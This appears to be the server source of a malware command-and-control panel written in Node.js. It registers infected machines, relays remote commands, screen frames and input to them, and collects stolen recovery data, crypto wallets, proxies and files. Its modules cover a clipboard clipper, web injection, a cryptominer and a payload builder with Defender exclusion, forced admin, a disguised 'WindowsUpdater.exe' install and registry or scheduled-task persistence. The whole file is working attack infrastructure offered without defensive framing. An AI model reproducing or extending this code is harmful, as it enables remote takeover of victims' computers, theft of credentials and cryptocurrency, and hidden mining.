const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const OPERATOR_KEY = process.env.OPERATOR_KEY || 'changeme';
const PORT = process.env.PORT || 3000;

const clients = new Map();
const operators = new Set();

const db = {
  recovery: [],
  wallets: [],
  proxy: [],
  clipper: { entries: [], enabled: false },
  webinjection: [],
  sorter: [],
  autotasks: [],
  filestore: [],
  miner: { jobs: [], stats: { active: 0, hashrate: 0, accepted: 0, rejected: 0 } },
  checker: { configs: [] },
  checkersessions: [],
  builder: {
    clientTag: 'Guest', note: '',
    mutex: 'CoreHelper_' + Math.random().toString(16).slice(2, 14),
    defenderExclusion: false, forceAdmin: false, debug: false,
    install: { enabled: false, location: '%appdata%', folder: 'UpdaterPolicy', filename: 'WindowsUpdater.exe', hidden: false, system: false, melt: false, registry: false, taskScheduler: false },
    final: { client: 'exe', pumpEnabled: false, pumpSize: 1 },
    builds: []
  }
};

app.use(express.json({ limit: '100mb' }));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/style.css', (req, res) => res.sendFile(__dirname + '/style.css'));
app.get('/panel.js', (req, res) => res.sendFile(__dirname + '/panel.js'));
app.get('/socket.io/socket.io.js', (req, res) =>
  res.sendFile(require.resolve('socket.io/client-dist/socket.io.js'))
);

function auth(req, res, next) {
  const key = req.headers['x-operator-key'] || req.query.key;
  if (key !== OPERATOR_KEY) return res.status(401).json({ error: 'unauthorized' });
  next();
}

app.get('/api/clients', auth, (req, res) => {
  res.json([...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
});

app.post('/api/cmd/:id', auth, (req, res) => {
  const c = clients.get(req.params.id);
  if (!c) return res.status(404).json({ error: 'client not found' });
  c.socket.emit('cmd', req.body);
  res.json({ ok: true });
});

function collection(name) {
  app.get('/api/' + name, auth, (req, res) => res.json(db[name] || []));
  app.post('/api/' + name, auth, (req, res) => {
    const item = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), ...req.body, createdAt: new Date().toISOString() };
    if (Array.isArray(db[name])) db[name].push(item);
    res.json(item);
  });
  app.delete('/api/' + name + '/:id', auth, (req, res) => {
    if (Array.isArray(db[name])) db[name] = db[name].filter(x => x.id !== req.params.id);
    res.json({ ok: true });
  });
}

['recovery','wallets','proxy','webinjection','sorter','autotasks','filestore','checkersessions'].forEach(collection);

app.get('/api/clipper', auth, (req, res) => res.json(db.clipper));
app.post('/api/clipper', auth, (req, res) => { db.clipper = { ...db.clipper, ...req.body }; res.json(db.clipper); });

app.get('/api/miner', auth, (req, res) => res.json(db.miner));
app.post('/api/miner', auth, (req, res) => { db.miner = { ...db.miner, ...req.body }; res.json(db.miner); });

app.get('/api/checker', auth, (req, res) => res.json(db.checker));
app.post('/api/checker', auth, (req, res) => { db.checker = { ...db.checker, ...req.body }; res.json(db.checker); });

app.get('/api/builder', auth, (req, res) => res.json(db.builder));
app.post('/api/builder', auth, (req, res) => { db.builder = { ...db.builder, ...req.body }; res.json(db.builder); });

app.post('/api/builder/build', auth, (req, res) => {
  const build = {
    id: Date.now().toString(36),
    name: db.builder.clientTag || 'Guest',
    size: (Math.random() * 400 + 400).toFixed(0) + ' KB',
    createdAt: new Date().toISOString(),
    password: Math.floor(1000 + Math.random() * 9000).toString()
  };
  db.builder.builds.unshift(build);
  db.builder.builds = db.builder.builds.slice(0, 10);
  res.json(build);
});

app.get('/api/stats', auth, (req, res) => {
  res.json({
    clients: clients.size,
    recovery: db.recovery.length,
    wallets: db.wallets.length,
    proxy: db.proxy.length,
    filestore: db.filestore.length,
    checkersessions: db.checkersessions.length
  });
});

io.on('connection', (socket) => {
  socket.on('operator:register', (key) => {
    if (key !== OPERATOR_KEY) { socket.emit('operator:error', 'invalid key'); return socket.disconnect(); }
    operators.add(socket.id);
    socket.emit('operator:ready');
    socket.emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('register', (meta) => {
    clients.set(socket.id, { socket, meta, lastFrame: null });
    io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('frame', (data) => {
    const c = clients.get(socket.id);
    if (c) { c.lastFrame = data; io.to([...operators]).emit('frame', { id: socket.id, data }); }
  });
  socket.on('output', (payload) => { io.to([...operators]).emit('output', { id: socket.id, ...payload }); });
  socket.on('push', ({ collection: col, item }) => {
    if (Array.isArray(db[col])) {
      const entry = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), clientId: socket.id, ...item, createdAt: new Date().toISOString() };
      db[col].push(entry);
      io.to([...operators]).emit('push', { collection: col, item: entry });
    }
  });
  socket.on('operator:cmd', ({ targetId, cmd }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('cmd', cmd);
  });
  socket.on('operator:input', ({ targetId, evt }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('input', evt);
  });
  socket.on('disconnect', () => {
    if (clients.has(socket.id)) {
      clients.delete(socket.id);
      io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
    }
    operators.delete(socket.id);
  });
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
